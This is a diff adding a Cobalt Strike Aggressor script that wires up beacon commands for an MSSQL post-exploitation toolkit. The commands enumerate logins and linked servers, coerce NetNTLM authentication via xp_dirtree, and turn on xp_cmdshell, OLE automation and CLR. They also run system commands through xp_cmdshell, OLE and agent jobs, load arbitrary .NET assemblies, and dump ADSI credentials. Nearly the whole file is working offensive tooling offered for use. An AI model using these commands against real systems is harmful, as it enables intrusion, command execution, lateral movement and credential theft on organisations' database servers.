@@ -1,0 +1,785 @@
+sub readbof {
+	local('$barch $handle $data');
+	$barch  = barch($1);
+
+	# read in the right BOF file
+    println(script_resource("$2 $+ / $+ $2 $+ . $+ $barch $+ .o"));
+	$handle = openf(script_resource("$2 $+ / $+ $2 $+ . $+ $barch $+ .o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+	if(strlen($data) == 0)
+	{
+		berror($1, "could not read bof file");
+	}
+	
+	return $data;
+}
+
+alias sql-whoami {
+    local('$args $barch $server $database $link $impersonate');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-whoami"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    $link = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to gather SQL user info on " . $server);
+	
+	$args = bof_pack($1, "zzzz", $server, $database, $link, $impersonate);
+	beacon_inline_execute($1, readbof($1, "whoami"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-whoami", 
+	"Gather logged in user, mapped user and roles", 
+	"sql-whoami [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-info {
+    local('$args $barch $server $database');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-info"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    
+	btask($1, "Tasked beacon to gather SQL server info on " . $server);
+	
+	$args = bof_pack($1, "zz", $server, $database);
+	beacon_inline_execute($1, readbof($1, "info"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-info", 
+	"Gather information about the SQL server", 
+	"sql-info [server] [opt: database]"
+);
+
+alias sql-impersonate {
+    local('$args $barch $server $database');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-impersonate"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    
+	btask($1, "Tasked beacon to gather SQL logins that can be impersonated on " . $server);
+	
+	$args = bof_pack($1, "zz", $server, $database);
+	beacon_inline_execute($1, readbof($1, "impersonate"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-impersonate", 
+	"Enumerate users that can be impersonated", 
+	"sql-impersonate [server] [opt: database]"
+);
+
+alias sql-links {
+    local('$args $barch $server $database $link $impersonate');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-links"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    $link = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to gather SQL links on " . $server);
+	
+	$args = bof_pack($1, "zzzz", $server, $database, $link, $impersonate);
+	beacon_inline_execute($1, readbof($1, "links"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-links", 
+	"Enumerate linked servers", 
+	"sql-links [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-users {
+    local('$args $barch $server $database $link $impersonate');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-users"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    $link = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to gather SQL server users on " . $server);
+	
+	$args = bof_pack($1, "zzzz", $server, $database, $link, $impersonate);
+	beacon_inline_execute($1, readbof($1, "users"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-users", 
+	"Enumerate users with database access", 
+	"sql-users [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-databases {
+    local('$args $barch $server $database $link $impersonate');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-databases"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    $link = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to gather SQL databases on " . $server);
+	
+	$args = bof_pack($1, "zzzz", $server, $database, $link, $impersonate);
+	beacon_inline_execute($1, readbof($1, "databases"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-databases", 
+	"Enumerate databases on a server", 
+	"sql-databases [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-tables {
+    local('$args $barch $server $database $link $impersonate');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-tables"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    $link = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to gather SQL database tables on " . $server);
+	
+	$args = bof_pack($1, "zzzz", $server, $database, $link, $impersonate);
+	beacon_inline_execute($1, readbof($1, "tables"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-tables", 
+	"Enumerate tables within a database", 
+	"sql-tables [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-columns {
+    local('$args $barch $server $table $database $link $impersonate');
+	
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("sql-columns"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+    $table = $3;
+	$database = iff(-istrue $4, $4, "");
+    $link = iff(-istrue $5, $5, "");
+    $impersonate = iff(-istrue $6, $6, "");
+    
+	btask($1, "Tasked beacon to gather SQL table columns on " . $server);
+	
+	$args = bof_pack($1, "zzzzz", $server, $database, $table, $link, $impersonate);
+	beacon_inline_execute($1, readbof($1, "columns"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-columns", 
+	"Enumerate columns within a table", 
+	"sql-columns [server] [table] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-rows {
+    local('$args $barch $server $table $database $link $impersonate');
+	
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("sql-rows"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+    $table = $3;
+	$database = iff(-istrue $4, $4, "");
+    $link = iff(-istrue $5, $5, "");
+    $impersonate = iff(-istrue $6, $6, "");
+    
+	btask($1, "Tasked beacon to gather SQL table rows on " . $server);
+	
+	$args = bof_pack($1, "zzzzz", $server, $database, $table, $link, $impersonate);
+	beacon_inline_execute($1, readbof($1, "rows"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-rows", 
+	"Get the count of rows in a table", 
+	"sql-rows [server] [table] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-checkrpc {
+    local('$args $barch $server $database $link $impersonate');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-checkrpc"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    $link = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to gather RPC status of linked servers on " . $server);
+	
+	$args = bof_pack($1, "zzzz", $server, $database, $link, $impersonate);
+	beacon_inline_execute($1, readbof($1, "checkrpc"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-checkrpc", 
+	"Enumerate RPC status of linked servers", 
+	"sql-checkrpc [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-query {
+    local('$args $barch $server $query $database $link $impersonate');
+	
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("sql-query"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+    $query = $3;
+	$database = iff(-istrue $4, $4, "");
+    $link = iff(-istrue $5, $5, "");
+    $impersonate = iff(-istrue $6, $6, "");
+    
+	btask($1, "Tasked beacon to execute a custom SQL query on " . $server);
+	
+	$args = bof_pack($1, "zzzzz", $server, $database, $link, $impersonate, $query);
+	beacon_inline_execute($1, readbof($1, "query"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-query", 
+	"Execute a custom SQL query", 
+	"sql-query [server] [query] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-search {
+    local('$args $barch $server $keyword $database $link $impersonate');
+	
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("sql-search"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+    $keyword = $3;
+	$database = iff(-istrue $4, $4, "");
+    $link = iff(-istrue $5, $5, "");
+    $impersonate = iff(-istrue $6, $6, "");
+    
+	btask($1, "Tasked beacon to search columns names on " . $server);
+	
+	$args = bof_pack($1, "zzzzz", $server, $database, $link, $impersonate, $keyword);
+	beacon_inline_execute($1, readbof($1, "search"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-search", 
+	"Search a table for a column name", 
+	"sql-search [server] [keyword] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-smb {
+    local('$args $barch $server $listener $database $link $impersonate');
+	
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("sql-smb"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+    $listener = $3;
+	$database = iff(-istrue $4, $4, "");
+    $link = iff(-istrue $5, $5, "");
+    $impersonate = iff(-istrue $6, $6, "");
+    
+	btask($1, "Tasked beacon to coerce SMB auth from " . $server);
+	
+	$args = bof_pack($1, "zzzzz", $server, $database, $link, $impersonate, $listener);
+	beacon_inline_execute($1, readbof($1, "smb"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-smb", 
+	"Coerce NetNTLM auth via xp_dirtree", 
+	"sql-smb [server] [\\\\listener] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-enablerpc {
+    local('$args $barch $server $link $database $impersonate');
+	
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("sql-enablerpc"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$link = iff(-istrue $3, $3, "");
+    $database = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to enable RPC on link " . $link);
+	
+	$args = bof_pack($1, "zzzzzz", $server, $database, $link, $impersonate, "rpc", "TRUE");
+	beacon_inline_execute($1, readbof($1, "togglemodule"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-enablerpc", 
+	"Enable RPC and RPC Out on linked server", 
+	"sql-enablerpc [server] [linkedserver] [opt: database] [opt: impersonate]"
+);
+
+alias sql-disablerpc {
+    local('$args $barch $server $link $database $impersonate');
+	
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("sql-disablerpc"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$link = iff(-istrue $3, $3, "");
+    $database = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to disable RPC on link " . $link);
+	
+	$args = bof_pack($1, "zzzzzz", $server, $database, $link, $impersonate, "rpc", "FALSE");
+	beacon_inline_execute($1, readbof($1, "togglemodule"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-disablerpc", 
+	"Disable RPC and RPC Out on linked server", 
+	"sql-disablerpc [server] [linkedserver] [opt: database] [opt: impersonate]"
+);
+
+alias sql-enableclr {
+    local('$args $barch $server $database $link $impersonate');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-enableclr"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    $link = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to enable CLR integration");
+	
+	$args = bof_pack($1, "zzzzzz", $server, $database, $link, $impersonate, "clr enabled", "1");
+	beacon_inline_execute($1, readbof($1, "togglemodule"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-enableclr", 
+	"Enable CLR integration", 
+	"sql-enableclr [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-disableclr {
+    local('$args $barch $server $database $link $impersonate');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-disableclr"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    $link = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to disable CLR integration");
+	
+	$args = bof_pack($1, "zzzzzz", $server, $database, $link, $impersonate, "clr enabled", "0");
+	beacon_inline_execute($1, readbof($1, "togglemodule"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-disableclr", 
+	"Enable CLR integration", 
+	"sql-disableclr [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-enablexp {
+    local('$args $barch $server $database $link $impersonate');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-enablexp"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    $link = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to enable xp_cmdshell");
+	
+	$args = bof_pack($1, "zzzzzz", $server, $database, $link, $impersonate, "xp_cmdshell", "1");
+	beacon_inline_execute($1, readbof($1, "togglemodule"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-enablexp", 
+	"Enable xp_cmdshell", 
+	"sql-enablexp [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-disablexp {
+    local('$args $barch $server $database $link $impersonate');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-disablexp"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    $link = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to disable xp_cmdshell");
+	
+	$args = bof_pack($1, "zzzzzz", $server, $database, $link, $impersonate, "xp_cmdshell", "0");
+	beacon_inline_execute($1, readbof($1, "togglemodule"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-disablexp", 
+	"Disable xp_cmdshell", 
+	"sql-disablexp [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-enableole {
+    local('$args $barch $server $database $link $impersonate');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-enableole"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    $link = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to enable OLE Automation Procedures");
+	
+	$args = bof_pack($1, "zzzzzz", $server, $database, $link, $impersonate, "Ole Automation Procedures", "1");
+	beacon_inline_execute($1, readbof($1, "togglemodule"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-enableole", 
+	"Enable OLE Automation Procedures", 
+	"sql-enableole [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-disableole {
+    local('$args $barch $server $database $link $impersonate');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-disableole"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    $link = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to disable OLE Automation Procedures");
+	
+	$args = bof_pack($1, "zzzzzz", $server, $database, $link, $impersonate, "Ole Automation Procedures", "0");
+	beacon_inline_execute($1, readbof($1, "togglemodule"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-disableole", 
+	"Disable OLE Automation Procedures", 
+	"sql-disableole [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-xpcmd {
+    local('$args $barch $server $command $database $link $impersonate');
+	
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("sql-xpcmd"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+    $command = $3;
+	$database = iff(-istrue $4, $4, "");
+    $link = iff(-istrue $5, $5, "");
+    $impersonate = iff(-istrue $6, $6, "");
+    
+	btask($1, "Tasked beacon to execute a command via xp_cmdshell");
+	
+	$args = bof_pack($1, "zzzzz", $server, $database, $link, $impersonate, $command);
+	beacon_inline_execute($1, readbof($1, "xpcmd"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-xpcmd", 
+	"Execute a system command using xp_cmdshell", 
+	"sql-xpcmd [server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]\n\n" .
+	"Output returned unless using a linked server. WARNING: running a persistent command will cause the beacon to hang"
+);
+
+alias sql-olecmd {
+    local('$args $barch $server $command $database $link $impersonate');
+	
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("sql-olecmd"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+    $command = $3;
+	$database = iff(-istrue $4, $4, "");
+    $link = iff(-istrue $5, $5, "");
+    $impersonate = iff(-istrue $6, $6, "");
+    
+	btask($1, "Tasked beacon to execute a command using OLE automation procedures");
+	
+	$args = bof_pack($1, "zzzzz", $server, $database, $link, $impersonate, $command);
+	beacon_inline_execute($1, readbof($1, "olecmd"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-olecmd", 
+	"Execute a system command using OLE automation procedures", 
+	"sql-olecmd [server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]\n\n" .
+	"Output is not returned"
+);
+
+alias sql-clr {
+    local('$args $barch $handle $server $dllpath $hash $bytes $function $database $link $impersonate');
+	
+	if(size(@_) < 4)
+	{
+		berror($1, beacon_command_detail("sql-olecmd"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+    $dllpath = $3;
+	$function = $4;
+	$database = iff(-istrue $5, $5, "");
+    $link = iff(-istrue $6, $6, "");
+    $impersonate = iff(-istrue $7, $7, "");
+
+    if (!-canread $dllpath)
+    {
+        berror($1, "Invalid file path " . $dllpath . " - Cannot read file");
+        berror($1, beacon_command_detail("sql-clr"));
+        return;
+    }
+
+	if ("Windows*" iswm systemProperties()["os.name"]) {
+		$execute = exec("powershell -c \"\(Get-FileHash -Algorithm SHA512 -Path $dllpath\).Hash\"");
+	}
+	else {
+		$execute = exec("sha512sum " . $dllpath);
+	}
+	
+	$return = wait($execute);
+	
+	if ($return != 0)
+	{
+		berror($1, "Error calculating SHA-512 of DLL");
+		return;
+	}
+	else
+	{
+		@arrayOut = (readAll($execute));
+		$hash = split(" ", @arrayOut[-1])[0];
+	}
+
+	$handle = openf($dllpath);
+	$bytes = readb($handle, -1);
+	closef($handle);
+
+	btask($1, "Tasked beacon execute custom assembly on " . $server);
+
+	$args = bof_pack($1, "zzzzzzb", $server, $database, $link, $impersonate, $function, $hash, $bytes);
+	beacon_inline_execute($1, readbof($1, "clr"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-clr", 
+	"Load and execute .NET assembly in a stored procedure", 
+	"sql-clr [server] [dll_path] [function] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-agentcmd {
+    local('$args $barch $server $command $database $link $impersonate');
+	
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("sql-agentcmd"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+    $command = $3;
+	$database = iff(-istrue $4, $4, "");
+    $link = iff(-istrue $5, $5, "");
+    $impersonate = iff(-istrue $6, $6, "");
+    
+	btask($1, "Tasked beacon to create SQL agent job on " . $server);
+	
+	$args = bof_pack($1, "zzzzz", $server, $database, $link, $impersonate, $command);
+	beacon_inline_execute($1, readbof($1, "agentcmd"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-agentcmd", 
+	"Execute a system command using agent jobs", 
+	"sql-agentcmd [server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]\n\n" .
+	"Output is not returned"
+);
+
+alias sql-agentstatus {
+    local('$args $barch $server $database $link $impersonate');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-agentstatus"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    $link = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to query SQL agent jobs on " . $server);
+	
+	$args = bof_pack($1, "zzzz", $server, $database, $link, $impersonate);
+	beacon_inline_execute($1, readbof($1, "agentstatus"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-agentstatus", 
+	"Enumerate SQL agent status and jobs", 
+	"sql-agentstatus [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-adsi {
+    local('$args $barch $server $adsiserver $port $database $link $impersonate');
+	
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("sql-adsi"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$adsiserver = $3;
+	$port = iff(-istrue $4, $4, "4444");
+	$database = iff(-istrue $5, $5, "");
+    $link = iff(-istrue $6, $6, "");
+    $impersonate = iff(-istrue $7, $7, "");
+    
+	btask($1, "Tasked beacon to dump ADSI creds on " . $server);
+	
+	$args = bof_pack($1, "zzzzzz", $server, $database, $link, $impersonate, $adsiserver, $port);
+	beacon_inline_execute($1, readbof($1, "adsi"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-adsi", 
+	"Obtain ADSI creds from ADSI linked server", 
+	"sql-adsi [server] [ADSI_linkedserver] [opt: port] [opt: database] [opt: linkedserver] [opt: impersonate]\n\n" .
+	"Port defaults to 4444. This gets opened on the SQL Server with the ADSI link, not the beaconing host"
+);
+
+alias sql-1434udp {
+    local('$args $barch $server');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-1434udp"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+    
+	btask($1, "Tasked beacon to get SQL Server connection info from " . $server);
+	
+	$args = bof_pack($1, "z", $server);
+	beacon_inline_execute($1, readbof($1, "1434udp"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-1434udp", 
+	"Obtain SQL Server connection information from the SQL Server Browser service (1434/UDP)", 
+	"sql-1434udp [server IP]\n\n" .
+	"Must provide an IP; hostnames are not accepted"
+);
